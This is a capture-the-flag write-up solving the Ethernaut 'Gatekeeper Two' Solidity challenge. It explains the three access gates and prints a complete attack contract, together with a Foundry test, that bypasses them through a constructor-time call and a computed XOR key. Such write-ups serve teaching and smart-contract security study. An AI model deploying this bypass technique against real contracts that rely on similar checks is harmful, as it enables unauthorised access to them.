# Level 14 - Gatekeeper Two

## Objectives

- Make it pass the gatekeeper and register as an entrant to pass this level.

## Contract Overview

To reach the objective and enter the `GatekeeperTwo` contract it is necessary to get pass the three gates.

## Finding the weak spots

In the `GatekeeperTwo` contract, all modifiers follow the correct execution paths, and they either revert the transaction or end with an underscore \_. To successfully enter the contract, the requirements set by the modifiers must be satisfied.

### The first gate

```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin); // <-- this line over here
    _;
  }
```

To satisfy the `msg.sender =! tx.origin` check we need to call the
`GatekeeperTwo` contract from another contract. This is the same thing as in the
[Telephone - level 4](https://github.com/matrix-0wl/ethernaut-solutions-foundry/tree/master/src/levels/04-Telephone) and [GatekeeperOne - level 13](https://github.com/matrix-0wl/ethernaut-solutions-foundry/tree/master/src/levels/13-GatekeeperOne)
challenges.

In other words to ensure that `msg.sender` and `tx.origin` are different, an intermediary contract can be created to make function calls to the `GatekeeperTwo` contract. By doing so, the caller's address will become the `tx.origin`, and the deployed contract's address will be the `msg.sender` received by the `GatekeeperTwo` contract.

### The second gate

```solidity
  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```

In Solidity, we can use low-level codes by using assembly in YUL. They can be used inside `assembly {...}`. `extcodesize` is one such opcode that returns the code's size of any address.

The `x` variable is being checked to make sure that the size of the contract's code is 0, in other words, an EOA should make the call and not another contract.

If the `caller` was an EOA (Externally Owned Account) that would always return zero, but this cannot be the case because as we said the `caller` (`msg.sender`) must be a Smart Contract because of the first gate requirement.

This is where constructor's come into play. During a contract's initialization, or when it's constructor is being called, its runtime code size will always be 0.

So when we put our exploit logic and call it from inside a constructor, the return value of `extcodesize` will always return zero. This essentially means that all our exploit code will be called from inside of our contract's constructor to go through the second gate.

### The third gate

To pass the final gate of the `GatekeeperTwo` contract, we need to find a single `_gateKey` value that satisfies all the following requirements:

```solidity
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }
```

This is a simple XOR operation and we know that A ^ B = C is equal to A ^ C = B. Using this logic we can very easily find the value of the unknown `_gateKey` simply by using the following code:
`uint64 hash = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));`
`bytes8 _gatekey = bytes8(hash ^ type(uint64).max);`

This mean that we can calculate the correct gateKey by executing:
`uint64 hash = uint64(bytes8(keccak256(abi.encodePacked(this))));`
`bytes8 _gatekey = bytes8(hash ^ type(uint64).max);`

## Potential attack scenario (hypothesis)

An attacker can register themselves as an entrant in the `GatekeeperTwo` contract by calling the enter function from the `GatekeeperTwoAttack` contract.

- A call from the contract will satisfy the criteria of the first gate.
- This call can be made from within the constructor to pass the first and the second gate.
- To pass the third gate attacker can calculate the `_gateKey` by using the commutativity property of the "exclusive or" operator.

## Plan of the attack

1. Attacker creates the `GatekeeperTwoAttack` contract
2. The constructor of the attack contract takes the address of the `GatekeeperTwo` contract as an argument.
3. The constructor calculates the `uint(64)_gateKey` and casts it to `bytes8` as this is the type accepted by the `enter()` function in the `GateKeeperTwo` contract.
4. The `_gateKey` is calculated from this equation: `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max) = uint64(_gateKey)`
5. The `msg.sender` in this case is the address of the attack contract itself. So it will be calculated with the address of `this`.
6. From within the constructor a call to the `enter()` function will be made with the calculated `_gateKey` as an argument.
7. This will set the `tx.origin` (attacker) as an entrant in the `GatekeeperTwo` contract.

## Malicious contract (GatekeeperTwoAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo gatekeeperTwoContract;

    constructor(address _gatekeeperTwoContract) public {
        gatekeeperTwoContract = GatekeeperTwo(_gatekeeperTwoContract);

        uint64 hash = uint64(bytes8(keccak256(abi.encodePacked(this))));

        bytes8 _gatekey = bytes8(hash ^ type(uint64).max);

        gatekeeperTwoContract.enter(_gatekey);
    }
}
```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/14-GatekeeperTwo.t.sol))

```solidity
         GatekeeperTwoAttack gatekeeperTwoAttack;

        gatekeeperTwoAttack = new GatekeeperTwoAttack(
            address(gatekeeperTwoContract)
        );

        emit log_named_address(
            "Address of the entrant: ",
            gatekeeperTwoContract.entrant()
        );

        assertEq(gatekeeperTwoContract.entrant(), tx.origin);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/GatekeeperTwo.png)

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-14-solution-gatekeeper-two)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
